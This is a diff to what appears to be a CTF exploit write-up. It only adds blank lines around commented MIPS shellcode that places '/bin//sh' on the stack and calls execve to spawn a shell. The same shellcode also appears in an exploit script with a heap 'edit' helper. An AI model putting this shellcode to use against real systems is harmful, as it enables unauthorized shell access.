@@ -56,14 +56,23 @@ shellcode += b"\xff\xff\x06\x28"  # slti $a2, $zero, -1
 shellcode += b"\x62\x69\x0f\x3c"  # lui $t7, 0x6962
 
 shellcode += b"\x2f\x2f\xef\x35"  # ori $t7, $t7, 0x2f2f
+
 shellcode += b"\xf4\xff\xaf\xaf"  # sw $t7, -0xc($sp)
+
 shellcode += b"\x73\x68\x0e\x3c"  # lui $t6, 0x6873
+
 shellcode += b"\x6e\x2f\xce\x35"  # ori $t6, $t6, 0x2f6e
+
 shellcode += b"\xf8\xff\xae\xaf"  # sw $t6, -8($sp)
+
 shellcode += b"\xfc\xff\xa0\xaf"  # sw $zero, -4($sp)
+
 shellcode += b"\xf4\xff\xa4\x27"  # addiu $a0, $sp, -0xc
+
 shellcode += b"\xff\xff\x05\x28"  # slti $a1, $zero, -1
+
 shellcode += b"\xab\x0f\x02\x24"  # addiu;$v0, $zero, 0xfab
+
 shellcode += b"\x0c\x01\x01\x01"  # syscall 0x40404
 ```
 
@@ -127,16 +136,27 @@ def edit(idx,con):
 	sl(con)
 
 shellcode = "\xff\xff\x06\x28"  # slti $a2, $zero, -1
+
 shellcode += "\x62\x69\x0f\x3c"  # lui $t7, 0x6962
+
 shellcode += "\x2f\x2f\xef\x35"  # ori $t7, $t7, 0x2f2f
+
 shellcode += "\xf4\xff\xaf\xaf"  # sw $t7, -0xc($sp)
+
 shellcode += "\x73\x68\x0e\x3c"  # lui $t6, 0x6873
+
 shellcode += "\x6e\x2f\xce\x35"  # ori $t6, $t6, 0x2f6e
+
 shellcode += "\xf8\xff\xae\xaf"  # sw $t6, -8($sp)
+
 shellcode += "\xfc\xff\xa0\xaf"  # sw $zero, -4($sp)
+
 shellcode += "\xf4\xff\xa4\x27"  # addiu $a0, $sp, -0xc
+
 shellcode += "\xff\xff\x05\x28"  # slti $a1, $zero, -1
+
 shellcode += "\xab\x0f\x02\x24"  # addiu;$v0, $zero, 0xfab
+
 shellcode += "\x0c\x01\x01\x01"	 # syscall 0x40404
 
 
